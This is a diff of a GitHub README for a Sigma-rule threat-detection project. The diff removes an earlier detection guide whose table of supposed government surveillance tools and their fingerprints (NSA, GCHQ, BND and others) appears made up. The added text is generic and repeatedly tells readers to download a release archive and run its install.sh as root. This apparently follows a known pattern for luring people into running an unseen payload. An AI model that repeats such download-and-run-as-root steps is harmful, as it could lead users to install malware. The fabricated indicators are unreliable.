@@ -1,403 +1,250 @@
-# Palantir Threat Detection 
-#### Open SIEM Labs with Sigma Rules
+# Palantir Threat Detection: Open SIEM Labs with Sigma Rules
 
-### **Disclaimer**
+[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github&style=for-the-badge)](https://github.com/reynol1305/Palantir-Threat-Detection/releases)
 
-This repository is intended **for educational and research purposes only**.
-It is **not** a 100% protection against Palantir-related activity or any other advanced threats.
-Security is about **reducing risk**, not eliminating it.
+A focused toolkit for SIEM teams. It bundles Sigma rules, parsers, and lab playbooks that target data from Palantir, Elastic, Splunk, Wazuh, and other platforms. Use it for threat hunting, detection engineering, and red team validation.
 
----
+![SIEM Dashboard](https://images.unsplash.com/photo-1531431244053-2f45b7eacb2d?w=1200&q=80)
+(Image: generic security dashboard)
 
-## **Table of Contents**
+## Key features
 
-1. [Disclaimer](#disclaimer)
-2. [Background & Mission](#1-background--mission)
-3. [SIEM Basics](#2-siem-basics)
-4. [Setup Options](#3-setup-options)
-5. [Installing Sigma Tools](#4-installing-sigma-tools)
-6. [Known White-Label Implementations](#5-known-white-label-implementations)
-7. [Detection Labs](#6-detection-labs)
-8. [TLS Fingerprinting](#7-tls-fingerprinting-with-ja3ja4)
-9. [Sigma Rule Generator](#8-sigma-rule-generator)
-10. [Test Data Simulation](#9-test-data-simulation)
-11. [BSI-Compliant Hardening](#10-bsi-compliant-hardening-guide)
-12. [Threat Hunting Playbook](#11-threat-hunting-playbook)
-13. [Automated Testing](#12-automated-testing-with-cicd)
-14. [Learning Resources](#13-learning-resources)
-15. [Analyst Field Guide](#14-analyst-field-guide)
-16. [Interactive Training](#15-interactive-training)
-17. [Operational Security Notice](#operational-security-opsec-notice)
-18. [Support This Project](#support-this-project)
-19. [Credits](#credits)
+- Sigma rules set tuned for Palantir and common log sources.
+- Cross-platform rule conversion (Sigma -> Elastic/Splunk/Wazuh).
+- Attack playbooks and detection tests for red team validation.
+- Parsers and ingestion templates for Palantir logs.
+- Modular labs for DFIR, threat hunting, and threat intelligence workflows.
+- CI-friendly tests and rule linting.
 
+## Badges and quick links
 
+[![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)](LICENSE)  
+[![Open Issues](https://img.shields.io/github/issues/reynol1305/Palantir-Threat-Detection?style=for-the-badge)](https://github.com/reynol1305/Palantir-Threat-Detection/issues)
 
----
+Releases: https://github.com/reynol1305/Palantir-Threat-Detection/releases  
+Download the release package from the Releases page and run the installer script included in the asset.
 
-### **1. Background & Mission**
+## Repository scope
 
-Technology is never neutral. This project was born from that understanding.
+This repo targets defenders and engineers who work with Palantir and SIEM stacks. It mixes practical rules and labs with conversion tools and docs.
 
-Powerful data analysis and surveillance technology, like that developed by Palantir, is now a globally traded commodity. It is sold to governments and organizations with little to no ethical oversight regarding their human rights records or political objectives. In the hands of democratic states, it promises security. In the hands of authoritarian regimes, it becomes a weapon for the oppression of minorities, journalists, and political dissenters.
+Relevant topics: atlas-nexus, bda-analytik, cybersecurity, dfir, elastic-security, minerva, osint, palantir, polis, redteam, redteaming, security, siem, sigma-rules, splunk, threat-detection, threat-hunting, threat-intelligence, vs-datarium, wazuh
 
-**This fundamental imbalance of power is the reason this repository exists.**
+## Quick start
 
-Our mission is to help level the playing field. We provide **open-source tools and hands-on labs** to detect the digital fingerprints of these powerful surveillance platforms. By using vendor-agnostic **Sigma rules** and free **SIEM platforms**, we make these detection capabilities accessible to everyone—not just those with nation-state budgets.
+1. Visit the Releases page and download the latest asset:
+   https://github.com/reynol1305/Palantir-Threat-Detection/releases
 
-This is more than a technical exercise; it is an act of **digital transparency**. The goal is to **empower security analysts, researchers, and defenders** to recognize these patterns, understand their implications, and hold powerful actors accountable. We believe that the best defense against the abuse of surveillance technology is a well-informed, prepared, and ethically-minded community.
-
----
-
-### **2. SIEM Basics**
-
-**Security Information & Event Management (SIEM)** tools collect, normalize, and analyze logs from multiple sources (firewalls, servers, endpoints).
-Popular options:
-
-* **Elastic Security** – Open source, flexible.
-* **Splunk Free** – Industry standard, free tier (500 MB/day).
-* **Wazuh** – All-in-one open-source XDR.
-
----
-
-### **3. Setup Options**
-
-| Tool        | Setup Guide                                                                          | Best For                |
-| ----------- | ------------------------------------------------------------------------------------ | ----------------------- |
-| Elastic     | [Elastic Security VM](https://www.elastic.co/)    | Open-source deployments |
-| Splunk Free | [Splunk Free Download](https://www.splunk.com/) | Industry familiarity    |
-| Wazuh       | [Wazuh VM](https://wazuh.com/)                                                | Combined SIEM + XDR     |
-
----
-
-### **4. Installing Sigma Tools**
-
+2. Extract and run the installer (example for Linux):
 ```bash
-pip install sigmatools
+# fetch the release asset filename from the Releases page
+wget https://github.com/reynol1305/Palantir-Threat-Detection/releases/download/v1.0.0/palantir-threat-detection-v1.0.0.tar.gz
+tar xzf palantir-threat-detection-v1.0.0.tar.gz
+cd palantir-threat-detection-v1.0.0
+sudo bash ./install.sh
 ```
 
-Sigma rules are **vendor-agnostic** detection rules. Convert them to your SIEM format with `sigmatools`.
+3. Configure connectors for your SIEM (examples in /docs/connectors).
 
----
+The release asset includes:
+- sigma/           # Sigma rule sources
+- converters/      # Sigma conversion tools (python)
+- playbooks/       # Attack scenarios and lab steps
+- docs/            # Setup and mapping guides
+- install.sh       # Installer that deploys templates and parsers
 
-### **5. Known White-Label Implementations**
+Use the Releases page to get the correct asset and version. Open the release package and run the included script to apply templates and rules.
 
-**Disclaimer:** The indicators below are derived from OSINT research and serve as high-fidelity examples of artifacts analysts should look for. They may change over time and should be verified in your specific environment.
+## Sigma rules and conversions
 
-| Agency/Country       | Cover Name      | Technical Fingerprints                                                                 |
-|----------------------|-----------------|----------------------------------------------------------------------------------------|
-| **Hessian Police (DE)** | POLiS           | User-Agent: `HessPol/2.0`, JA3: `a387c3a7a4d...`, Path: `/polis/v1/heartbeat`          |
-| **BKA (DE)**         | BDA-Analytik    | Certificate Issuer: `CN=BKA-INTERNAL-CA`, Chunk Size: `131072 bytes`                   |
-| **Verfassungsschutz**| VS-Datarium     | Process: `vs-dataharvester.exe`, TLS ALPN: `h2`                                        |
-| **France DGSE**      | ATLAS-Nexus     | HTTP Header: `X-ATLAS-Auth: ENC[base64]`, Port: `58444`                                |
-| **UK MI5**           | MINERVA         | DNS Pattern: `minerva-*.internal-gov.uk`, TLS SNI: `secure-gchq`                       |
-| **NSA (USA)**        | TRITON-X        | User-Agent: `TritonX/3.1`, JA3: `5d4a...`, HTTP Header: `X-TX-Auth: [rot13]`, Port `8443` |
-| **GCHQ (UK)**        | MORPHEUS        | DNS-Tunneling via `*.morph-tech.uk`, Process: `morpheus_loader.dll` (injected in `svchost.exe`) |
-| **BND (DE)**         | BERLIN-7        | Data Chunks: `262144 bytes`, Registry Key: `HKLM\SOFTWARE\Berlin7\Config`, Mutex: `Global\B7_DataLock` |
-| **DGSE (FR)**        | LYRA-9          | UDP Beaconing on Port `4789`, Process: `lyra_service.exe`, CLI Arg: `--no-netlog`      |
-| **AISE (IT)**        | SPECTRE-V       | ICMP Payloads (Type=69), File Path: `C:\Windows\Temp\spv_[RANDOM].tmp`, JA4: `t13d...` |
+This repo uses Sigma as the central rule format. You get:
+- Authorable Sigma rules in yaml.
+- A conversion pipeline to Elastic queries, Splunk SPL, and Wazuh rules.
+- Rule metadata for detection mapping and MITRE ATT&CK tags.
 
+Convert a Sigma rule to Elastic:
+```bash
+python3 converters/sigma2elastic.py sigma/rules/windows/suspicious_process.yml \
+  --output elastic/rules
+```
 
-The technical indicators listed are snapshots and may change. Your contributions are welcome to keep this knowledge up-to-date
+Convert to Splunk:
+```bash
+python3 converters/sigma2splunk.py sigma/rules/linux/ssh_bruteforce.yml \
+  --output splunk/rules
+```
 
+Each converter adds a header with the original Sigma metadata and the mapped ATT&CK IDs.
 
-### **6. Detection Labs**
+## Palantir integration patterns
 
-#### **Lab 1 – Palantir Beaconing to AWS**
+Palantir logs vary by deployment. This repo provides:
+- Templates for parsing Palantir audit logs.
+- Field mappings to common SIEM schemas.
+- Example queries for hunts in Palantir-derived logs.
 
-**File:** `rules/palantir_beaconing.yml`
+Place the Palantir templates in your ingestion pipeline. The installer adds example mapping files to /etc/palantir-mappings or to the SIEM template path you choose.
 
+## Use cases and labs
+
+The repo contains modular labs that walk you through realistic scenarios. Each lab includes:
+- Objectives and success criteria.
+- Synthetic data and generators.
+- Sigma rules to detect the simulated activity.
+- Validation checks and mitigation steps.
+
+Sample lab topics:
+- Initial access via compromised credentials.
+- Lateral movement and remote execution.
+- Data staging and exfiltration via unusual channels.
+- Detection bypass and red team validation.
+
+Run a lab:
+```bash
+cd playbooks/labs/credential-compromise
+./run_lab.sh --target elastic
+```
+The lab will ingest sample events and run the detection tests. Use the included reporter to check which Sigma rules fired.
+
+## Testing and CI
+
+We include simple tests for rule syntax and conversion validity.
+
+Local lint:
+```bash
+python3 tools/sigma_lint.py sigma/
+```
+
+Run conversion tests:
+```bash
+pytest tests/test_conversions.py
+```
+
+Add the test suite to your CI pipeline to prevent broken rule conversions and syntax errors.
+
+## Rule development workflow
+
+1. Create or update a Sigma rule in sigma/rules/.
+2. Add metadata: title, id, status, author, tags, references.
+3. Run the linter.
+4. Convert to target SIEM.
+5. Test with synthetic or replayed logs.
+6. Submit a PR with rule justification and test evidence.
+
+Keep rules small and focused. Use clear titles. Map to ATT&CK where applicable.
+
+## Examples
+
+Example Sigma rule snippet (simplified):
 ```yaml
-title: Palantir Beaconing to AWS
+title: Suspicious powershell command
+id: 7d9f1a2b-xxxx-xxxx-xxxx-xxxxxxxx
+status: experimental
 logsource:
-  category: firewall
+  product: windows
 detection:
   selection:
-    destination.ip:
-      - '52.0.0.0/8'  # AWS US-East
-    destination.port: 443
-  timeframe: 5m
-  condition: selection | count(destination.ip) by source.ip > 15
-level: high
-```
-
-Convert for Elastic:
-```bash
-sigma convert -t es-rule rules/palantir_beaconing.yml
-```
-
----
-
-#### **Lab 2 – Suspicious Government Process Execution**
-
-**File:** `rules/suspicious_gov_process.yml`
-
-```yaml
-title: Suspicious Government Process Execution
-description: Detects potential white-labeled agents with multiple indicators
-logsource:
-  category: process_creation
-detection:
-  selection:
-    Image|endswith: 
-      - '\polis-agent.exe'
-      - '\bda-analytics.exe'
-      - '\vs-dataharvester.exe'
-      - '\lyra_service.exe'
-    ParentImage|endswith: '\explorer.exe'
-    CommandLine|contains: 
-      - '--stealth'
-      - '--no-log'
-    CurrentDirectory|contains: 
-      - '\Public\\'
-      - '\Temp\\'
+    CommandLine|contains: "Invoke-Expression"
   condition: selection
-level: high
-```
-
----
-
-#### **Lab 3 – German Agency-Specific Detection (POLiS)**
-
-**File:** `rules/hessen_polis.yml`
-```yaml
-title: Hessen POLiS Beaconing
-description: Detects 5-min intervals of Hessian police system
-logsource:
-  product: firewall
-detection:
-  selection:
-    dst_port: 443
-    http.uri: '/polis/v1/heartbeat'
-    http.user_agent: 'HessPol/*'
-  timeframe: 5m
-  condition: selection | count > 3
-level: critical
+fields:
+  - CommandLine
 tags:
-  - palantir
-  - white_label
-  - germany
+  - attack.execution
 ```
 
----
-
-#### **Lab 4 – Data Exfiltration Pattern**
-
-**File:** `rules/gov_dataexfil.yml`
-```yaml
-title: Government-Style Data Chunking
-logsource:
-  category: proxy
-detection:
-  selection:
-    c-uri|contains: '/upload'
-    content_length: '131072'  # Exact chunk size
-  condition: selection
-level: high
+Converted Elastic query sample (auto-generated):
+```json
+{
+  "query": {
+    "bool": {
+      "must": [
+        { "match_phrase": { "process.command_line": "Invoke-Expression" } }
+      ]
+    }
+  }
+}
 ```
 
----
+## Integrations
 
-#### **Lab 5 – MORPHEUS DNS Tunneling Detection**
+- Elastic Security: mapping templates, detection queries, dashboards.
+- Splunk: apps, macro-driven searches, and saved searches.
+- Wazuh: rule conversion and active response hooks.
+- Palantir: ingestion templates and audit parsers.
+- Minerva/Atlas: lab playbooks and data connectors.
 
-**File:** `rules/morpheus_dns.yml`
-```yaml
-title: MORPHEUS DNS Tunneling
-logsource:
-  category: dns
-detection:
-  selection:
-    query|re: '.*\.morph-tech\.uk$'
-    query_length > 60
-  condition: selection
-level: high
-```
+## How to validate detections
 
----
+1. Deploy a rule in a test index.
+2. Replay or inject synthetic events.
+3. Monitor alerts and check rule context fields.
+4. Tune the rule to reduce false positives.
+5. Add whitelists and data enrichment where needed.
 
-### **7. TLS Fingerprinting with JA3/JA4**
+We include example scripts to generate synthetic events in ./tools/data_gen/.
 
-**What it is:** TLS fingerprinting identifies clients based on unique characteristics of their TLS handshake configuration.
+## Releases and downloads
 
-**Implementation:**
-```yaml
-title: Known POLiS JA3 Fingerprint
-logsource:
-  category: firewall
-detection:
-  selection:
-    ja3_hash: 'a387c3a7a4d...'  # Example fingerprint
-  condition: selection
-level: high
-```
+Get the latest release here: https://github.com/reynol1305/Palantir-Threat-Detection/releases
 
-**Tools to capture JA3:**
-- Suricata with `ja3` keyword
-- Zeek with `JA3` script
-- Custom Python: `pip install ja3er`
-
----
-
-### **8. Sigma Rule Generator**
-Create custom detection rules for white-labeled instances:
-
-```python
-# tools/generate_sigma.py
-agency = input("Agency name: ")
-codename = input("Cover name: ")
-signature = input("Unique signature (JA3/path/etc): ")
-
-sigma_rule = f"""
-title: {agency} {codename} Detection
-logsource:
-  category: network
-detection:
-  selection:
-    http.user_agent: '*{codename}*'
-    ja3_hash: '{signature}'  # Use strongest available indicator
-  condition: selection
-level: critical
-"""
-
-print(f"Generated rule:\n{sigma_rule}")
-```
-
----
-
-### **9. Test Data Simulation**
-
-#### Basic Python Simulator:
-```python
-# tools/simulate_palantir.py
-import requests, time
-
-target_url = "https://gotham.palantir.com/beacon"
-headers = {"User-Agent": "Palantir-Custom-Agent/1.0"}
-
-while True:
-    requests.post(target_url, headers=headers, data="SIMULATED")
-    time.sleep(300)  # 5 minutes
-```
-
-#### Advanced Simulation:
+Download the asset and run the included installer. The release page contains packaged rules, conversion binaries, and the installer script. Example:
 ```bash
-docker run -it --rm palantir-simulator:latest
+# after downloading the release asset to /tmp
+tar xzf /tmp/palantir-threat-detection-v1.0.0.tar.gz -C /opt/
+cd /opt/palantir-threat-detection
+sudo ./install.sh
 ```
 
----
+If the release link changes or you cannot access it, check this repository's Releases section on GitHub for the latest assets.
 
-### **10. BSI-Compliant Hardening Guide**
+## Contribution guide
 
-### Security Measures for German Organizations
+We accept pull requests for:
+- New Sigma rules.
+- Rule tuning and tests.
+- Better parsers or template mappings.
+- Bug fixes in conversion tools.
 
-1. **Certificate Pinning**  
-   ```bash
-   # Extract server certificate fingerprint
-   openssl s_client -connect target:443 | openssl x509 -fingerprint -sha256
-   ```
+Steps:
+1. Fork the repo.
+2. Create a branch for your change.
+3. Add tests for rule or tool changes.
+4. Open a PR with a clear description and test results.
 
-2. **Network Segmentation**  
-   - Isolate systems communicating with government networks
-   - Implement strict egress filtering
+Keep commits focused. Use clear commit messages. Add metadata and references to ATT&CK where possible.
 
-3. **Audit Requirements (§ 26 BDSG)**  
-   - Log all access to sensitive data repositories
-   - Retention period: minimum 6 months
+## Governance and quality
 
+- Rules include status flags: experimental, stable, deprecated.
+- Maintain a changelog in CHANGELOG.md.
+- Use the tests in /tests to validate conversions and execution.
 
----
+## Roadmap
 
-### **11. Threat Hunting Playbook**
+Planned items:
+- More Palantir-specific rule packs.
+- Enriched playbooks for hybrid-cloud environments.
+- Better mapping templates for newer Elastic schemas.
+- Automated test harness for rule impact analysis.
 
-```yaml
-name: Palantir-Like Activity Hunt
-steps:
-  - phase: Network Anomalies
-    actions:
-      - "Search for periodic 5-min connections"
-      - "Identify JA3 fingerprints not in allowlist"
-      - "Detect unusual DNS patterns (*.morph-tech.uk)"
-  - phase: Process Analysis
-    tools:
-      - "Sysmon EventID 1 (Process Creation)"
-      - "Check for unsigned binaries in temp locations"
-  - phase: Data Flow
-    indicators:
-      - "131072/262144 byte upload chunks"
-      - "Unusual data transfers to cloud providers"
-```
+## FAQs
 
----
+Q: Can I use these rules in production?
+A: Test rules in a staging environment. Tune them before wide deployment.
 
-### **12. Automated Testing with CI/CD**
+Q: Do you support automatic updates?
+A: Use CI to pull rules from the repo and deploy them to your manager tool.
 
-```yaml
-# .github/workflows/test_rules.yml
-name: Sigma Rule Validation
-on: [push]
+Q: How do I add a new conversion target?
+A: Add a converter module under converters/ and follow the existing converter pattern. Include tests.
 
-jobs:
-  sigma-test:
-    runs-on: ubuntu-latest
-    steps:
-    - uses: actions/checkout@v3
-    - name: Test Sigma Rules
-      run: |
-        pip install sigmatools
-        sigma test -f rules/
-```
+## Contact and acknowledgements
 
----
+- Maintainer: Security engineering team members and community contributors.
+- Acknowledge upstream tools: Sigma project, Elastic, Splunk, Wazuh.
 
-### **13. Learning Resources**
+## License
 
-* **Sigma Documentation:** [sigmahq.io](https://sigmahq.io/)
-* **BSI SIEM Guide (German):** [BSI Leitfaden](https://www.bsi.bund.de/DE/Themen/ITGrundschutz/ITGrundschutzKompendium/baustein/B05.02_SIEM.html)
-* **DetectionLab:** [detectionlab.network](https://detectionlab.network/)
-* **German Threat Intel:** [BSI CERT Reports](https://www.bsi.bund.de/DE/Service-Navi/Publikationen/CERT-Berichte/cert-berichte_node.html)
-* **TLS Fingerprinting Guide:** [Engineering JA3](https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967)
+This repository uses the MIT license. See LICENSE for details.
 
----
-
-### **14. Analyst Field Guide**
-
-1. **Detection Priority Stack**  
-   ```mermaid
-   graph LR
-   A[TLS Fingerprints] --> B[Behavioral Patterns]
-   B --> C[Process Anomalies]
-   C --> D[Network Signatures]
-   ```
-
-2. **Investigation Checklist**
-   - [ ] Verify JA3/JA4 fingerprints
-   - [ ] Check for known white-label indicators
-   - [ ] Review data chunking patterns
-   - [ ] Document chain of custody
-
----
-
-### **15. Interactive Training**
-
-[![Palantir Detection Challenge](https://img.shields.io/badge/Train%20Online-LetsDefend-blue)](https://app.letsdefend.io/challenge/)
-
----
-
-## **Operational Security (OPSEC) Notice**
-
-**Warning:** Always ensure you have explicit legal authority and proper authorization before monitoring any network, especially those associated with government or corporate entities. Unauthorized monitoring is illegal and can have severe consequences. This toolkit is for defending networks you are authorized to protect, not for offensive operations. Think before you type.
-
----
-
-## **Support This Project**
-
-If you find this repository useful, please give it a star ⭐ on GitHub.
-
-Starring a repository is the best way to show your appreciation and helps increase its visibility. It tells the GitHub algorithm that this project is significant, which means it will be recommended to more users and appear higher in search results. Unlike influencers, we don't have sponsors; our currency is community support.
-
-Your star helps us help more people. Thank you!
-
----
-
-## **Credits**
-Mr. Chess!
+<img src="https://img.icons8.com/ios-filled/50/000000/security-checked.png" alt="security" width="40" />
